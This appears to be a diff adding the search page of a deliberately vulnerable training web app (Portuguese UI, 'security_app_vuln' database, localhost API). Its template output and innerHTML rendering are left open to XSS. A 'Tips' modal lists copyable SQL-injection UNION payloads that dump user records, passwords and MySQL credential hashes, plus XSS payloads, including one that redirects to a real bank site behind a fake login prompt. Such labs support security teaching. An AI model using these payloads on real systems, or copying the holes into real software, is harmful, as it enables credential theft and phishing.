@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/main.css">
+
+
+    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.0.7/dist/umd/popper.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
+
+    <script href="js/main.js"></script>
+    
+    <title>Public</title>
+
+</head>
+<body>
+
+<div class="container">
+    
+    <div class="row">
+        <div class="col-lg-12">
+            <div class="d-flex justify-content-between">
+                <h2 class="" id="welcome"></h2> 
+                <button type="button" class="btn btn-light bg-primary" onclick="login()">Login</button>
+            </div>           
+            
+            <form class="product-form">
+                <div class="form-group">
+                    <label for="productName">Buscar Cursos</label>
+                    <div class="d-flex justify-content-between">
+                        <input type="text" class="form-control" id="productName" oninput="updateUrl(this.value)" onkeypress="verificarEnter(event)" placeholder="Digite o nome do Curso" value="{{#SEARCH_TERM#}}">
+                        <button type="button" class="btn btn-light bg-success" onclick="openTips()">Tips</button>
+                    </div> 
+                    
+                    <h2 id="busca">{{#SEARCH_TERM#}}</h2>
+                </div>
+            </form>
+        </div>
+
+        <div class="col-lg-12">
+            <div class="errMsg" id="errMsg"></div>
+            <div class="table-container">
+                <h2 class="">Lista de Cursos</h2>
+                <div class="table-responsive">
+                    <table class="table product-table">
+                        <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Nome do Curso</th>
+                            <th>Nome do Professor</th>
+                        </tr>
+                        </thead>
+                        <tbody id="productTableBody">
+
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- Modal  -->
+<div class="modal" id="loadingModal" tabindex="-1" role="dialog" aria-labelledby="loadingModalLabel" aria-hidden="true">
+    <div class=" modal-dialog" role="document">
+        <div class=" modal-content">
+            <div class="modal-body text-center">
+                <div class="spinner-border text-primary" role="status">
+                    <span class="sr-only">Carregando...</span>
+                </div>
+                <p class="mt-2">Loading... </p>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- Modal 2  -->
+<div class="modal" id="tipsModal" tabindex="-1" role="dialog" aria-labelledby="loadingModalLabel" aria-hidden="true">
+    <div class=" modal-dialog" role="document">
+        <div class=" modal-content">
+            <div class="modal-body text-center">
+                <ul class="styled-list">
+                    <li onclick="handleItemClick(this)">1'or 1='1</li>
+                    <li onclick="handleItemClick(this)">-1' union select 1,2,3'</li>
+                    <li onclick="handleItemClick(this)">-1' union select 1,version(),3'</li>
+                    <li onclick="handleItemClick(this)">-1' union select 1,user(),version()'</li>
+                    <li onclick="handleItemClick(this)">-1' union select user(),version(),database()'</li>
+                    <li onclick="handleItemClick(this)">-1' union select 1,table_name,3 from information_schema.tables %23</li>
+                    <li onclick="handleItemClick(this)">-1' union select 1,table_name,3 from information_schema.tables where table_schema="security_app_vuln" %23</li>
+                    <li onclick="handleItemClick(this)">-1' union select 1,column_name,3 from information_schema.columns where table_schema="security_app_vuln" and table_name="users" %23</li>
+                    <li onclick="handleItemClick(this)">-1' union select userId, name,password from users %23</li>
+                    <li onclick="handleItemClick(this)">-1' union select concat(userId,',',name), concat(email,',',phoneNo), concat(username,',',cargo) from users %23</li>
+                    <li onclick="handleItemClick(this)">-1' union select senhaId, name, informacao_critica from tabela_de_senhas %23</li>
+                    <li onclick="handleItemClick(this)">-1' union select concat(Host,',',User), authentication_string, concat(password_expired,',',password_last_changed) from mysql.user %23</li>
+                    <li onclick="handleItemClick(this)">&lt;script&gtalert("XSS attack!");&lt;/script&gt</li>
+                    <li onclick="handleItemClick(this)">&lt;button class="btn btn-light bg-danger" onclick="alert('XSS attack!')">Clique Aqui&lt;/button></li>
+                    <li onclick="handleItemClick(this)">&lt;button type="button" class="btn btn-light bg-danger"&gtXSS attack!&lt;/button&gt</li>
+                    <li onclick="handleItemClick(this)">&lt;script>window.location.href="https://www.itau.com.br/"&lt;/script></li>
+                    <li onclick="handleItemClick(this)">&lt;script>alert("Autentique-se para realizar a pesquisa");window.location.href="https://www.itau.com.br/"&lt;/script></li>
+                    <!-- <li onclick="handleItemClick(this)"></li> -->
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
+<script>
+
+    
+    function load(){
+        
+        
+        const userName = localStorage.getItem('user');
+        if(userName){
+            $('#welcome').text("Olá, " +  userName)
+        } else {
+            $('#welcome').text("Olá, visitante")
+        }
+
+        search()
+        
+    }
+
+    function login(){
+        localStorage.removeItem('token');
+
+        window.location.href = '/login';
+    }
+
+    load()
+
+    function openTips(){
+        $('#tipsModal').modal('show');
+    }
+
+    function handleItemClick(element){
+        const text = element.textContent || element.innerText;
+
+        navigator.clipboard.writeText(text)
+            .then(() => {
+                element.classList.add('bg-success');
+                setTimeout(() => {
+                    element.classList.remove('bg-success');
+                }, 1000);
+            })
+            .catch(err => {
+                console.error('Erro ao copiar para o clipboard:', err);
+            });
+    }
+
+    function updateUrl(searchTerm) {
+        event.preventDefault();
+        $('#busca').text($('#productName').val())
+        const currentUrl = new URL(window.location.href);
+        currentUrl.searchParams.set('termo', searchTerm);
+        window.history.replaceState({}, '', currentUrl.href);
+    }
+
+    function verificarEnter(event) {
+        if (event.key === 'Enter') {
+            event.preventDefault();
+            search()
+      }
+    }
+
+    function search(){
+
+        $('#errMsg').text('')
+        const currUrl = new URL(window.location.href);
+        const termo = currUrl.searchParams.get('termo');
+        const data = {
+            termo: termo
+        };
+
+        const options = {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        };
+
+        const tableBody = document.getElementById('productTableBody');
+        tableBody.innerHTML = '';
+
+        const url = `http://localhost:3000/api/getPublic`;
+
+        fetch(url, options)
+            .then(response => response.json())
+            .then(data => {
+                console.log(data); 
+                if(data.FLAG == "E"){
+                    $('#errMsg').text(data.RETURN)
+                } else {
+                    $('#errMsg').text('')
+                    
+                    data.RETURN.forEach(curso => {
+                        const row = document.createElement('tr');
+                        row.innerHTML = `
+                            <td>${curso.cursoId}</td>
+                            <td>${curso.name}</td>
+                            <td>${curso.professor}</td>
+                        `;
+                        tableBody.appendChild(row);
+                    });
+
+                }
+
+                $('#loadingModal').modal('hide');
+            })
+        .catch(error => { 
+            console.error('Erro durante a solicitação:', error)
+            $('#loadingModal').modal('hide');
+        });
+
+    }
+
+</script>
